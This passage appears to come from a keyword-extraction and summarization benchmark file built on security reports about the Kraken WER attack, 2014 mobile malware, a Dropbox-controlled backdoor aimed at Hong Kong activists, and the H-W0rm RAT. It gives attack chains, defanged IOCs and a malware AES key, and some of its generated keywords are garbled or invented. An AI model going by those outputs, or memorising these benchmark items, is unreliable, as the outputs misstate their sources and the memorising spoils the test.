http request successIf the return value of [GPE] HTTPSendRequestExA is true , it means the request is successful and the code proceeds to the next step . In this step it calls VirtualAllocExA to allocate a memory region and then calls InternetReadFile to read the data and write it to the allocated memory . Figure [CARDINAL] 20 : InternetReadFile callAt the end it jumps to the start of the allocated memory to execute it . This is highly likely to be another shellcode that is hosted on the compromised \u201c asia-kotoba.net \u201d site and planted as a fake favicon in there . Since at the time of the report the target URL was down , we were not able to retrieve this shellcode for further analysis . The work of an [ORG] APT , but which one?We do not have enough evidence to attribute this attack . However , we have found some loose connections to APT32 and are still investigating them : url the Kraken : Fileless APT attack abuses [PRODUCT] Windows [PRODUCT] Error [PRODUCT] Reporting service - Malwarebytes Labs | [GPE] Malwarebytes LabsAPT32 is one of the actors that is known to use [ORG] CactusTorch [ORG] HTA to drop variants of the Denis Rat . However , since we were not able to get the final payload we can not definitely attribute this attack to APT32 . The domain used to host malicious archives and documents is registered in [GPE] Ho chi minh city , [GPE] Vietnam . APT32 has used strategic web compromises to target victims and is believed to be [GPE] Vietnam - based . [GPE] Malwarebytes blocks access to the compromised site hosting the payload : Figure [CARDINAL] 21 : Lure document attempting to contact remote siteIOCsLure document : yourrighttocompensation[.]com / pingArchive file download URLs : yourrighttocompensation[.]com/?rid = UNfxeHM yourrighttocompensation[.]com / download/ ? yourrighttocompensation[.]com/?rid = n6XThxD yourrighttocompensation[.]com/?rid = AuCllLUurl the Kraken : Fileless APT attack abuses [PRODUCT] Windows [PRODUCT] Error [PRODUCT] Reporting service - Malwarebytes Labs | [GPE] Malwarebytes LabsDownload URL for final payload : asia - kotoba[.]net / favicon32.icourl", "generated_text": "September 17; a new attack; Kraken; Windows Error Reporting; WER; a defense evasion mechanism; the attackers; a website; its payload; CactusTorch; the malware; a modified version; the CactusTorch framework; the malware; the.Net payload; fileless attacks; analysis; a variant; the Vietnamese APT32 group; payload; the.Net payload; the system; the victim; a worker; the payload; the victim; the payload; the registry; a file; a file; a command; a shellcode; the Kraken phishing campaign; the report; a payload; a payload.", "ref_text": "<START-1>This Malwarebytes report analyzes a new fileless attack called Kraken that abuses the Windows Error Reporting service. The attack starts with a phishing email containing a weaponized Word doc that uses a malicious macro to load and execute a .NET payload called Kraken loader. The Kraken loader injects shellcode into the WerFault.exe process. The shellcode uses several anti-analysis techniques to detect sandboxes and debugging. It then makes an HTTP request to download and execute another payload from a compromised server. Kraken follows an APT-style attack pattern, including spear phishing for initial access, fileless techniques, anti-analysis, compromised infrastructure, and multi-stage modular code. There are loose connections to APT32 based on prior TTPs, but attribution is not definitive. Key technical aspects of Kraken are: - Macro document fetching remote templates to hide embedded exploits - Custom .NET loader for process injection - Shellcode resolving APIs dynamically and launching child threads - Anti-analysis checks for debuggers, VMs, and supported CPU features - Download and execution of a next-stage payload from a strategic web compromise The abuse of Windows Error Reporting for stealthy implant deployment highlights that attackers are continuing to innovate techniques and living off the land to bypass defenses. Kraken shows sophisticated tradecraft indicative of an advanced persistent threat actor. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.41176470588235287, "gpt3/lexical/rouge_rouge2": 0.08875739644970414, "gpt3/lexical/rouge_rougeL": 0.21764705882352942, "gpt3/lexical/rouge_rougeLsum": 0.21764705882352942, "gpt3_generated_text": ["In a recent article, it was reported that on September 17th, a new attack called Kraken was discovered. This attack utilized the Windows Error Reporting (WER) service as a defense evasion mechanism. The attackers compromised a website to host its payload and used the CactusTorch framework to perform a fileless attack. The payload was a modified version of the CactusTorch VBA module that loaded a .Net payload into memory and executed it from vbscript. The loaded payload was a .Net DLL named Kraken.dll that injected an embedded shellcode into WerFault.exe. The article also mentioned that the attack has some similarities to the Vietnamese APT32 group, but no clear attribution could be made. Overall, the attack involved phishing, payload injection, and fileless techniques to target victims and evade detection."]}, {"split_name": "test", "sample_id": "test_8", "prompt_text": "Extract the keywords: [DATE] 2014 has been quite the storied year for the mobile threat landscape , and it is n\u2019t even over . From mobile malware reaching the daunting milestone of [CARDINAL] 2 [CARDINAL] million to being an accessory to breaking online banking security features , the mobile platform has certainly taken a pounding from cybercriminals \u2013 and it does n\u2019t look like it 's going to be stopping anytime soon . Read on to learn more about the most notable events from [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2014 , as far as mobile device security is concerned . [CARDINAL] Two [CARDINAL] Million and Counting mobile - malware - and - high - risk - app - total - count-01 Figure [CARDINAL] 1 . [PERSON] Mobile [PERSON] Malware and High - Risk App Total Count Back in [DATE] March , our on - going surveillance on mobile malware alerted us of a milestone : the combined amount of mobile malware and high - risk apps has reached [CARDINAL] two [CARDINAL] million unique samples . This happened within [DATE] six [DATE] months after the number previously reached [CARDINAL] 1 [CARDINAL] million . Not only that , this means that mobile malware has effectively outstripped PC malware in growth entirely \u2013 as the latter took [DATE] 22 [DATE] years to reach the same milestone that the former reached in [CARDINAL] half the time , according to statistics derived from AV - Test \u2019s [PERSON] Malware [PERSON] Repository . Figure [CARDINAL] 2 . PC and [ORG] Mobile [ORG] Malware [ORG] Growth [ORG] Comparison This shows that the problem of mobile malware will only continue to get bigger . Mobile devices continue to enjoy mainstream popularity , with more than 1.8 billion handsets sold [DATE] last [DATE] year . Mobile subscriptions worldwide have also reached nearly [CARDINAL] 7 [CARDINAL] billion users globally \u2013 and while that does not directly translate to mobile device users , it still provides cybercriminals with a large user base to try and take advantage of . We 've also been seeing more types of mobile malware sprouting up , each one either sporting new malicious routines or new behavior . This shows that mobile threats continue to evolve as its numbers continue to rise . It 's also proof that cybercriminals continue to pound mobile device users with their malicious creations . Analyzing the statistics from [ORG] Mobile [ORG] App [ORG] Reputation [ORG] Service , we can also see that mobile malware activity is particularly strong in [LOC] Asia and [LOC] the [LOC] Middle [LOC] East . See below for the chart depicting the top [CARDINAL] 10 countries with the most malicious mobile app downloads by percentage . Figure [CARDINAL] 3 . Top [CARDINAL] 10 Malicious Mobile App Downloads for [CARDINAL] 1H [DATE] 2014 [GPE] Israel gains the dubious honor of being at the top of the list , with 6.16 % of all apps downloaded that have been scanned by our [ORG] Mobile [ORG] App [ORG] Reputation [ORG] Service detected to be malicious . [GPE] Vietnam comes [ORDINAL] second , with 2.82 % . [GPE] China , [GPE] South [GPE] Korea and [GPE] Angola follow close behind with 1.83 % , 1.77 % and 1.43 % . A reason for this is that app piracy has been proven to be more prevalent in the countries listed , and as such the risk for malware infection increases proportionally . [GPE] Vietnam in particular is notorious for [ORDINAL] third - party download sites that sport \u2018 free \u2019 or \u2018 cracked \u2019 versions of popular apps . Interestingly , countries with high mobile device user populations such as the [GPE] US and [GPE] Japan did not make this list . This may be due to the fact that users from those territories are heavily dependent on first - party app download sites , and that their huge app download numbers are making the malicious app download numbers quite small by comparison \u2013 [PERCENT] less [PERCENT] than [PERCENT] 1 % ( 0.12 % for [GPE] US , 0.02 % for [GPE] Japan , 0.1 % for [GPE] Australia / [GPE] New [GPE] Zealand ) . We also found that for [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2014 , adware retained its top spot over all other types in terms of threat type distribution , with 44.41 % . [ORG] Premium [ORG] Service Abusers rank second with 29.96 % , and [ORG] Data Stealers / Info [ORG] Theft types take [ORDINAL] third . Figure [CARDINAL] 4 . Top Threat Type Distribution for [DATE] 1H [DATE] 2014 Meanwhile , the top malware and adware families for [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2014 are the OPFAKE family and the [ORG] GOYEAR family , with 11.22 % and 41.14 % of the total malware / adware numbers . OPFAKE is a family of [ORG] Premium [ORG] Service Abusers that is usually presented as fake apps , while [ORG] GOYEAR is a family of malicious / legitimate / repackaged apps that are coded to display aggressive advertisements . top-10 - malware - families-01 Figure [CARDINAL] 5 . Top Malware Families for [DATE] 1H [DATE] 2014 Figure [CARDINAL] 6 . Top Adware Families for [DATE] 1H [DATE] 2014 We mentioned mobile malware evolving to new types . Here are some of the most notable types that we \u2019ve found : Coin miners \u2013 [DATE] March saw the discovery of the ANDROIDOS_KAGECOIN malware family that had cryptocurrency mining capabilities for mining Bitcoin , [ORG] Dogecoin [ORG] and [ORG] Litecoin . Variants came in the form of repackaged popular apps that , when installed , turned the infected mobile device into a coin miner . \u2018 Deep Web \u2019 apps \u2013 ANDROIDOS_TORBOT.A , a malicious app that intercept SMS messages and make calls on the mobile device it infects , has also been found to be the [ORDINAL] first malware to use [ORG] TOR to conceal its malicious activities . Ransomware \u2013 [DATE] Late [DATE] May saw ransomware jumping over to mobile devices , with the discovery of ANDROIDOS_LOCKER.A. It locks users out of their devices by opening a window large enough that it blocks the phone \u2019s UI entirely , preventing the user access as well as preventing itself from being uninstalled . [DATE] A [DATE] few [DATE] weeks [DATE] later , another type of ransomware was discovered with [ORG] TOR stealth capabilities . Banking malware \u2013 In [DATE] late [DATE] July , it was discovered that cybercriminals have found another way to crack [CARDINAL] two - factor authentication on mobile devices . In a malware campaign we dubbed Emmental , cybercriminals countered this particular security measure through a fake banking app that intercepts [CARDINAL] 2FA messages from [NORP] European banks . What \u2019s unique here is that we were able to follow and track every step of this malicious campaign , the [ORDINAL] first of which involved a malicious spam attachment that modified the affected system \u2019s [ORG] DNS settings . Vulnerabilities that affected [ORG] Android OS and [ORG] Android apps were also put in the spotlight [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2014 . Notable examples include : [ORG] Android [ORG] Custom [ORG] Permission [ORG] Vulnerability \u2013 a vulnerability that affects how Android OS handles customized permissions was discovered in [DATE] late [DATE] March . The weakness lies in how a malicious app could be able to steal protected information from a legitimate app if the former manages to define a specific custom permission before the latter . This could be used to steal financial information from online shopping apps , or reveal browsing / in - app purchase history . [ORG] Android [ORG] System [ORG] Crash [ORG] Vulnerability \u2013 Also found in [DATE] March , a vulnerability in Google Bouncer \u2122 \u2019s infrastructure ( which also crosses over with [ORG] Android OS versions [CARDINAL] 4.0 and above ) resulted in mobile devices being trapped in a booting loop , rendering them useless . While this can be alleviated by resetting the mobile device to factory settings , it can result in a loss of user data . [ORG] Heartbleed [ORG] Vulnerability \u2013 When news of the OpenSSL Heartbleed bug broke out in [DATE] April , users were shocked to discover that their favorite websites could have easily been mined for critical user information easily and stealthily . [DATE] A [DATE] few [DATE] days [DATE] later , it was also discovered that some mobile apps were also affected by this vulnerability , as their in - app purchase menus also led to websites which could have been affected by [GPE] Heartbleed . iOS \u201c [WORK_OF_ART] Goto [WORK_OF_ART] Fail \u201d Vulnerability \u2013 a vulnerability involving the Secure Sockets Layer ( SSL ) suite in iOS version [CARDINAL] 7 , it had the potential to allow cybercriminals to eavesdrop and hijack a session taking place on a vulnerable mobile device connected to a shared network . This has already been patched . [DATE] Late [DATE] June also saw Google change its policy on how app permissions were handled . Instead of having the user approve each new permission needed by an app , that new permission is pre - approved IF it belongs to the same group of permissions that a user had already approved . While not exactly a vulnerability , such a change in the handling of permissions can be abused to grant malicious apps permissions that would allow them to steal personal information . Big sporting events and popular apps did not escape the attention of cybercriminals during [DATE] this [DATE] half [DATE] of [DATE] 2014 . The biggest examples of these are the [DATE] 2014 [EVENT] FIFA [EVENT] World [EVENT] Cup , and the worldwide gaming app phenomenon [PERSON] Flappy [PERSON] Bird . Cybercriminals took advantage of the popularity of both through numerous fake malicious apps and phishing pages , most notable of which is [CARDINAL] theANDROIDSMS_SMSSTEALER.HBT mobile malware family that attacked [EVENT] World [EVENT] Cup fans . Its variants disguised themselves as official FIFA 2014 game apps , and once installed , allowed cybercriminals to intercept SMS messages and connect to a [ORG] C&C server to listen for and execute remote commands . In the case of [PERSON] Flappy [PERSON] Bird , cybercriminals stormed the Internet with fake malicious copies once its popularity reached a fever pitch , peaking when its creator took the game app down due to personal issues . A single [ORDINAL] third - party store even had [CARDINAL] 500 variants of such fake malicious apps . Lessons Learned For The Next Half [DATE] The [DATE] first [DATE] half [DATE] of [DATE] 2014 has certainly been a busy one for the mobile threat landscape , with both expected ( socially - engineered threats ) and unexpected ( vulnerabilities ) attacks coming to the fore . We fully expect things to continue as they are , and we \u2019ll be here to help users and businesses protect themselves . Proof of this comes even at the heels of this report , with the discovery of the Android FakeID vulnerability by [PERSON] BlueBox [PERSON] Labs . This vulnerability may allow malicious apps to impersonate legitimate ones . While there 's no way to accurately predict what may come for [DATE] the [DATE] latter [DATE] half [DATE] of [DATE] 2014 \u2013 and what comes after mobile malware reaches [CARDINAL] three [CARDINAL] million samples - what users and organizations can do is to protect themselves from what \u2019s already out there , and keep up - to - date with further developments as they arrive . They must also be aware that mobile device attacks can also spread to other platforms and we may see more of this happening . Mobile security solutions , mobile usage guidelines , threat information and education \u2013 all of these must be applied for a safer and more secure digital mobile life . Posted in [ORG] Mobile [ORG] Safety , Threat Reports , [PERSON] Mobile [PERSON] Malware , Vulnerabilities", "generated_text": "mobile malware; 2 million; the first half of 2014; Asia; the Middle East; mobile malware activity; the number; iPhone; Android; 2.1 million; Vietnam; China; South Korea; North Korea; angola; adware; 4%; 1%; data stealers; info theft; third; services; data theft; adware downloaders; adware growth; adware adware; malware downloads; app piracy; malware activity; the Middle East; the Middle East; APT; indicators; compromise; the mobile threat.", "ref_text": "<START-1>The document provides an overview of major mobile security threats and trends from the first half of 2014. Key points: - Mobile malware reached 2 million samples, growing much faster than PC malware. Israel, Vietnam, China, and South Korea had the highest malware download rates. - New mobile malware types emerged like coin miners, malware using TOR for stealth, and mobile ransomware. Banking trojans also evolved to defeat two-factor authentication. - Vulnerabilities were found in Android permissions, boot processes, Heartbleed's impact on apps, and iOS SSL handling. - Major events like the World Cup and Flappy Bird's popularity were leveraged for social engineering attacks and fake malicious apps. - Top mobile malware families were OPFAKE (premium service abuser) and GOYEAR (aggressive ad display). Adware remained the top threat. - Asia and the Middle East saw the most mobile malware activity. Developed countries had lower infection rates likely due to using official app stores. - The threat landscape is expected to continue evolving rapidly. Ongoing user education, threat monitoring, mobile security solutions, and best practices are critical for protection. In summary, the document provides an overview of key mobile security issues, threats, and trends from the first half of 2014, highlighting the rapid growth in mobile malware and emerging cybercriminal tactics targeting mobile devices and apps. It emphasizes the need for vigilance and proactive defenses. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5126903553299492, "gpt3/lexical/rouge_rouge2": 0.17857142857142855, "gpt3/lexical/rouge_rougeL": 0.2284263959390863, "gpt3/lexical/rouge_rougeLsum": 0.2284263959390863, "gpt3_generated_text": ["The article discusses the increasing threat of mobile malware in the first half of 2014. It highlights that the number of mobile malware and high-risk apps has reached two million unique samples, surpassing PC malware in growth. The problem of mobile malware is expected to continue growing as mobile devices become more popular. The article also analyzes the distribution of mobile malware, with Asia and the Middle East showing particularly strong activity. It identifies Israel as the country with the highest percentage of malicious app downloads, followed by Vietnam, China, South Korea, and Angola. App piracy is believed to be a major factor contributing to this trend. Adware is identified as the most prevalent threat type, followed by premium service abusers and data stealers/info theft. The top malware and adware families are mentioned, including the OPFAKE and GOYEAR families. The article also briefly mentions other notable types of mobile malware, such as coin miners. Overall, the article highlights the evolving and increasing threat of mobile malware in the first half of 2014."]}, {"split_name": "test", "sample_id": "test_9", "prompt_text": "Extract the keywords: 12/3/2019Threat Actor [PERSON] Targeting [PERSON] Hong Kong Pro - Democracy [ORG] Figures [ORG] \u2013 ThreatReconThreat Actor [PERSON] Targeting [PERSON] Hong Kong Pro - Democracy [ORG] Figuresthreatrecon.nshc.net/2019/12/03/threat-actor-targeting-hong-kong-activistsThreatRecon [ORG] Team [ORG] Introduction At the end of October , a person deeply involved in the pro - democracy side of the [GPE] Hong [GPE] Kong protests received a spear phishing email from someone claiming to be a law student at a top foreign university , requesting for feedback on his supposed thesis which includes recommendations on how to end the [GPE] Hong [GPE] Kong unrest . The email contained a link to a Google drive ZIP \ufb01le . [DATE] December [DATE] 3 , 2019The contents of FYI.zip downloaded from [FAC] the [FAC] Google [FAC] Drive linkThe ZIP archive contained [CARDINAL] three \ufb01les \u2013 an [DATE] August [DATE] 2019 policy brief downloaded from [ORG] Freedom [ORG] House regarding [ORG] the [ORG] Democratic [ORG] Crisis in [GPE] Hong [GPE] Kong , a [DATE] September [DATE] 2019 [GPE] Hong [GPE] Kong report downloaded from Human Rights First , and a supposed [ORG] RTF \ufb01le from [ORG] the [ORG] Nikkei [ORG] Asian [ORG] Review.url Actor [PERSON] Targeting [PERSON] Hong Kong Pro - Democracy [ORG] Figures [ORG] \u2013 ThreatReconPublic document from [ORG] Freedom [ORG] Houseurl Actor [PERSON] Targeting [PERSON] Hong Kong Pro - Democracy [ORG] Figures [ORG] \u2013 ThreatReconPublic document from [ORG] Human [ORG] Rights [ORG] FirstThe [ORDINAL] third \ufb01le masquerading as a Nikkei Asian Review document is actually a [ORG] LNK shortcut \ufb01le which had a double extension . When [ORG] LNK \ufb01les are viewed through archiving software , the double extension \u201c .rtf.lnk \u201d will be shown correctly . If the \ufb01le was extracted and viewed through [ORG] the [ORG] Windows [ORG] Explorer , however , the operating system always hides the [ORG] LNK extension by default . Analysis of the [ORG] LNK \ufb01le shows running it will execute msiexec.exe to download and run a remote MSI \ufb01leurl Actor [PERSON] Targeting [PERSON] Hong Kong Pro - Democracy [ORG] Figures \u2013 ThreatReconThe [ORG] LNK \ufb01le is actually a shortcut to the Windows utility msiexec.exe , which can be used as a LOLBin to remotely download and run MSI \ufb01les which have the [ORG] PNG extension . In this case , the MSI \ufb01le is remotely downloaded from a [ORG] GitHub repository and account which was created on [DATE] October 10.A snapshot of the [ORG] GitHub repository on [DATE] October [DATE] 29siHost64 The MSI \ufb01le , \u201c siHost64.png \u201d , was created using a registered or cracked [ORG] EXEMSI program . Running it will drop and run \u201c siHost64.exe \u201d in the % APPDATA% folder . This executable is a [PERSON] PyInstaller executable which has over a thousand \ufb01les inside it , but the main important \ufb01le is the compiled python script \u201c siHost64\u201d.url Actor [PERSON] Targeting [PERSON] Hong Kong Pro - Democracy [ORG] Figures [ORG] \u2013 ThreatReconUnpacking the [PERSON] PyInstaller executable shows the real \ufb01les , some of which can not be seen when performingdynamic analysisBy restoring the \ufb01rst [CARDINAL] eight missing bytes of \u201c [WORK_OF_ART] siHost64 \u201d which is typically required for such [PERSON] PyInstaller \ufb01les , we are then able to decompile the compiled python script and analyze the functionality of this malware : Use the Python requests library to call the [ORG] DropBox API which connects to [ORG] DropBox and uses it as a HTTPS C2 server Use the system proxy for communications if any [ORG] Add itself to the registry [ORG] AutoRun location HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with the registry name \u201c [WORK_OF_ART] siHost64 \u201d . On [DATE] October [DATE] 31 , the new version of the malware changed the registry name used to \u201c [WORK_OF_ART] Dropbox [WORK_OF_ART] Update [WORK_OF_ART] Setup \u201d . Perform AES encryption with CBC mode on uploaded \ufb01les with the key \u201c ApmcJue1570368JnxBdGetr*^#ajLsOw \u201d and a random salt Check in to the C2 server by creating an encrypted \ufb01le containing the operating system version and architecture , date , computer name , and logged in user Check for \ufb01les from the [CARDINAL] C2 server which contain encrypted arbitrary commands to be run , execute that command , and create a new encrypted \ufb01le containing the results of the executed command.url Actor [PERSON] Targeting [PERSON] Hong Kong Pro - Democracy [ORG] Figures \u2013 ThreatReconExample of the malware using the Dropbox API to check inBased on the check in information from infected machines , it appears that there is a single infected [GPE] Hong [GPE] Kong victim of interest to this threat actor connecting to the [ORG] Dropbox app besides the target we described at the start . The \ufb01les ex\ufb01ltrated from this victim appeared to be personal documents related to the victim traveling to [GPE] the [GPE] United [GPE] States , business forms , and [NORP] Christian hymns . Besides those ex\ufb01ltrated documents , the [CARDINAL] C2 server also appeared to host their next stage malware such as [CARDINAL] two \ufb01les named \u201c GetCurrentRollback.exe \u201d and \u201c GetCurrentDeploy.dll \u201d . \u201c GetCurrentRollback.exe \u201d is a signed [ORG] Microsoft executable which seems to be for upgrading the previous [PRODUCT] Windows operating system version to Windows 10 , and \u201c GetCurrentDeploy.dll \u201d likely being the name of the [ORG] DLL which is side loaded . The \ufb01rst version of \u201c GetCurrentRollback.exe \u201d we could \ufb01nd was since [DATE] 2016 and the latest in [DATE] 2019 [DATE] November , which means all version might be exploitable by [ORG] DLL [ORG] Sideloading at \ufb01rst glance.url Actor [PERSON] Targeting [PERSON] Hong Kong Pro - Democracy [ORG] Figures \u2013 ThreatReconA version of [ORG] GetCurrentRollback.exe signed on [DATE] November 13 , [DATE] 2019 is still vulnerable to [ORG] DLL [ORG] SideloadingConclusion [ORG] Based on the victim pro\ufb01le and the ex\ufb01ltrated \ufb01les , it appears [CARDINAL] one of the intelligence requirements of the threat actor is to monitor people with relations to the [GPE] Hong [GPE] Kong protests , targeting either them or the people around them . There are multiple possibilities for this requirements , with the most likely being to understand the inner thoughts of pro - democracy movement , or to support or undermine the movement behind the scenes . Using Dropbox and other legitimate services such as [FAC] Google [FAC] Drive and [ORG] GitHub throughout the attack life cycle is not a new concept for threat actors , allowing them to easily bypass network detection . To counter this threat , enterprises or teams within enterprises nowadays block or detect such Shadow IT services if they are not in of\ufb01cial use , but individual or non - enterprise users which may be targeted by state sponsored threat actors rarely have this luxury . The full report detailing each event together with IoCs ( Indicators of Compromise ) and recommendations is available to existing NSHC [ORG] ThreatRecon customers . For more information , please contact [ORG] RA.global@nshc.net.url Actor [PERSON] Targeting [PERSON] Hong Kong Pro - Democracy [ORG] Figures [ORG] \u2013 ThreatReconMITRE ATT&CK Techniques The following is a list of MITRE ATT&CK Techniques we have observed based on our analysis of these and other related malware . Initial Access T1192 Spearphishing Link Execution T1204 User Execution T1218 Signed Binary Proxy Execution T1060 Registry Run [ORG] Keys [ORG] / [ORG] Startup [ORG] Folder Defense Evasion T1140 Deobfuscate / Decode Files or Information T1036 Masquerading T1112 [ORG] Modify [ORG] Registry T1027 Obfuscated Files or Information T1218 Signed Binary Proxy Execution T1102 Web Service Discovery T1083 File and [ORG] Directory [ORG] Discovery T1082 System Information Discovery T1033 System Owner / [ORG] User [ORG] Discovery [ORG] T1124 [ORG] System [ORG] Time [ORG] Discovery [ORG] Collection T1005 Data from [ORG] Local [ORG] System [ORG] Command and [ORG] Control [ORG] T1043 Commonly Used [ORG] Port [ORG] T1132 [ORG] Data [ORG] Encoding T1071 Standard Application Layer Protocol T1032 Standard Cryptographic Protocol T1102 Web Service Ex\ufb01ltrationurl Actor [PERSON] Targeting [PERSON] Hong Kong Pro - Democracy [ORG] Figures [ORG] \u2013 ThreatReconT1022 Data Encrypted T1041 Ex\ufb01ltration Over Command and [ORG] Control [ORG] Channelurl", "generated_text": "the document; threat actor; Hong Kong Pro-Democracy Figures; October; a spear; a Google drive ZIP file; the Google Drive; September 2019; a LNK shortcut file; a shortcut; the Windows utility; msiexec.exe; a LOLBin; the malware; the Python requests library; the Dropbox API; the DropBox API; the registry name; SiHost64; the registry name; Dropbox Update Setup; CBC mode; uploads; the registry; the dropbox API; a HTTPS C2 server; a proxy; communications; the system; the registry name; a GitHub folder; the network; the macros; the TCP/IP address; the packets; the CAN/IP address; the operational security; the MAC address; the MAC address; the IP address; the communication; the threat actor; the Hong Kong protests; the IPS; the IP addresses.", "ref_text": "<START-1>The PDF describes targeted attacks by an unnamed threat actor against Hong Kong pro-democracy figures in late 2019. The attacks started with spear phishing emails containing Google Drive links to weaponized ZIP archives. The archives contained benign documents related to Hong Kong as lures, along with a LNK shortcut that remotely downloaded and executed malware. The malware was a Python-based backdoor that used the Dropbox API as a C2 channel. It collected system info, installed an autorun registry key for persistence, and could receive encrypted commands from the C2 server to execute on the victim machine. At least one pro-democracy target and one other victim in Hong Kong were infected. The attacker exfiltrated personal documents from the second victim related to travel and business. The threat actor also staged additional payloads on the C2 server including signed Microsoft utilities that were vulnerable to DLL sideloading attacks. This indicates they intended to escalate privileges and compromise further. The report concludes the attackers likely aimed to monitor people related to the Hong Kong protests, in order to understand the pro-democracy movement. The use of legitimate services like GitHub and Dropbox helped them bypass network defenses. Overall, the PDF provides a case study of how this particular threat actor leveraged spear phishing, living off the land binaries, and cloud services to infiltrate their targets and exfiltrate sensitive data related to the Hong Kong protests. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4785553047404063, "gpt3/lexical/rouge_rouge2": 0.1541950113378685, "gpt3/lexical/rouge_rougeL": 0.27539503386004516, "gpt3/lexical/rouge_rougeLsum": 0.27539503386004516, "gpt3_generated_text": ["The article discusses the activities of a threat actor targeting Hong Kong pro-democracy figures. In October, a spear phishing email containing a link to a Google drive ZIP file was sent to a pro-democracy activist. The ZIP file contained public documents from Freedom House and Human Rights First, as well as a LNK shortcut file that, when executed, would download and run a remote MSI file. The MSI file, \"siHost64.png,\" was created using an EXEMSI program and would drop and run \"siHost64.exe\" in the %APPDATA% folder. This executable is a PyInstaller executable with over a thousand files inside, some of which cannot be seen during dynamic analysis. The malware uses the Python requests library to call the Dropbox API as a HTTPS C2 server, uses the system proxy for communications, and adds itself to the registry AutoRun location. It also performs AES encryption on uploaded files and checks in to the C2 server by creating an encrypted file containing system information. Based on the check-in information, it appears that there is a single infected Hong Kong victim of interest to this threat actor. This activity poses a significant threat to the operational security of pro-democracy figures involved in the Hong Kong protests."]}, {"split_name": "test", "sample_id": "test_10", "prompt_text": "Extract the keywords: Krebs on Security Schneier on Security Tech Dirt The Forrester Blog December 2015Gartner Report : Defining Intrusion Detection and Prevention Systems Understand the current state of [ORG] IPS / IDS , and use cases that are suitable / unsuitable for this tech to address . ReportHOMEABOUT USAUTHORSFIDELISSECURITY.COM \u00ab [WORK_OF_ART] Ten [WORK_OF_ART] Impossible [WORK_OF_ART] Things [WORK_OF_ART] You [WORK_OF_ART] Can Do with [ORG] Metadata , Part [CARDINAL] 2 | Main | [PERSON] Vawtrak [PERSON] DGA Round [CARDINAL] 2 \u00bb Wednesday , [DATE] November [DATE] 09 , 2016Commodity Remote Access Trojans ( RATs ) -- which are designed , productized and sold to the casual and experienced hacker alike -- put powerful remote access capabilities into the hands of criminals . RATs , such as H - W0rm , njRAT , KilerRAT , DarkComet , [GPE] Netwire , [GPE] XtremeRAT , JSocket / AlienSpy / Adwind and others , hold special interest for [ORG] the [ORG] Threat [ORG] Research [ORG] Team at [FAC] Fidelis [FAC] Cybersecurity . We 're constantly following , detecting and monitoring the lifecycle of these RATs as they appear , disappear and often reappear under a new moniker . There have been recent reports [CARDINAL] 1 , [CARDINAL] 2 about a new version of [CARDINAL] one such commodity [ORG] RAT , H - W0rm ( [ORG] Hworm ) , and the various campaigns it is being used in . Our telemetry shows that H - W0rm is one of the most active RATs we 've seen , with infections observed across virtually all enterprise verticals and geographies in which [PERSON] Fidelis [PERSON] Cybersecurity products are deployed . In this blog post , [ORG] the [ORG] Threat [ORG] Research [ORG] Team at [FAC] Fidelis [FAC] Cybersecurity is supplementing these recent reports by providing the security community with the following : Technical descriptions of the payload behavior when installed on the victim machine . [ORG] Domains observed in active infections over [DATE] the [DATE] past [DATE] six [DATE] months . We also make a larger mined dataset available through [PERSON] Fidelis [PERSON] Barncat , a malware configuration intelligence database shared at no cost with trusted [ORDINAL] third parties . Artifacts correlating [ORG] Hworm C2 domains with njRAT , XtremeRAT and DarkComet . [PERSON] Yara rules that can be used to detect the VBS and [ORG] PE versions of H - W0rm . The following is a screenshot of the [ORG] Hworm v.1.3 panel and the builder tab : Hworm [CARDINAL] 1.3 builder panel [ORG] Hworm [ORG] 1.3 server builder windowA Worm That 's Really a RAT It is worth clarifying that even though the malware is known as H - W0rm / Hworm , this version is not a typical worm . Specifically , it features classic [ORG] Remote [ORG] Access [ORG] Trojan capabilities that allow the adversary to fully control the infected system . Here is rundown of some of these capabilities : Collect system information : hardware ID , client name / campaign code , computer name , operating system , worm / RAT version , information about AV installed , webcam presence , etc . File Manager : download , rename , delete , execute [ORG] Remote [ORG] Desktop capture / screenshot [ORG] Keylogger [ORG] Collect password filled in forms from web browsers , such as [ORG] Mozilla [ORG] Firefox , [PERSON] Google [PERSON] Chrome , and [PERSON] Opera [PERSON] Run remote application or script from disk or internet , or load it in memory via RunPE Update RAT from disk or internet Close connection Uninstall RATLet 's Go to the [PERSON] Videotape A [ORG] YouTube video shows an [ORG] Hworm version that is referred to as version [CARDINAL] 2 . The following is a screenshot from [CARDINAL] one of the windows presented in the video : The [NORP] Exploit panel , under the Builder tab , looks interesting . At the moment , it is unclear how this feature works , but its mere presence suggests the potential for creating and integrating future exploits into the malware . The following is a screenshot of the panel : Our analysis found that one of the samples saved keystroke data into the % TEMP% directoryusing the filename [ malware_name.dat ] . In this instance , the malware was configured from the builder to be installed in the % TEMP% directory , but based on the builder settings , it can be installed in the % PROGRAMDATA% ( Windows 7 ) % TEMP%The malware also created the following hidden folder in the attached [ORG] USB drive : $ RECYCLE.BIN . The Link to Houdini There has been speculation in the research community [CARDINAL] 3 , [DATE] 4 , 5 that \" Houdini \" ( aka [EVENT] \u02bbMohamed [EVENT] Benabdellah\u02bc ) is believed to have connection with \u201c njq8 \u201d ( aka [ORG] \u02bbNaser [ORG] Al [ORG] Mutairi\u02bc ) , the initial developer of \u201c njRAT \u201d and \u201c njw0rm \u201d . It has further been speculated that \" Houdini \" is based in [GPE] Algeria and \u201c njq8 \u201d in [GPE] Kuwait . It is also said that \u201c njq8 \u201d has a connection with \u201c [WORK_OF_ART] Black [WORK_OF_ART] Mafia \u201d on the development on \u201c [WORK_OF_ART] Black [WORK_OF_ART] Worm \u201d , indicating potential collaboration between these RAT developers . AV Information in [ORG] the [ORG] Network [ORG] Traffic The network traffic of some versions of the [ORG] Hworm malware contain information about the antivirus tool installed in the victim system . This data indicates that some of the infected systems appeared to have been running antivirus tools like : [ORG] Microsoft [ORG] Security [ORG] Essentials [ORG] Symantec [ORG] Endpoint [ORG] Protection McAfee VirusScan Enterprise ESET Smart Security Windows DefenderNormally , those tools will detected the malware , but for some unknown reason it looks like the AV tools didn\u02bct remove those versions 